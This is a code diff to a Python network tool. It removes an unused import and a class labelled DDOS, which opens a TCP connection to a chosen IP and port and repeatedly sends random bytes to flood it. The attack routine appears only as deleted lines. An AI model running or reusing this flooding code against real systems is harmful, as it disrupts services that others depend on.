@@ -3,7 +3,6 @@ import socket
 import colorama
 from colorama import Fore as f
 from pyfiglet import figlet_format as ff
-import random
 
 colorama.init(autoreset=True)
 
@@ -64,25 +63,6 @@ class Scan:
     def close(self) -> None:
         os.system('clear')
 
-class DDOS:
-    def __init__(self, ip, port) -> None:
-        os.system('clear')
-        print(f.RED + ff("DDOS"))
-
-        self.ip = ip
-        self.port = port
-    
-    def attack(self,it=0) -> None:
-        try:
-            s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
-            s.connect_ex((self.ip,self.port))
-            print('connect succed')
-            for i in range (it):
-                s.send(random._urandom(10) * 100)
-            
-            
-        except Exception:
-            print(f'error {Exception}')
         
 
 
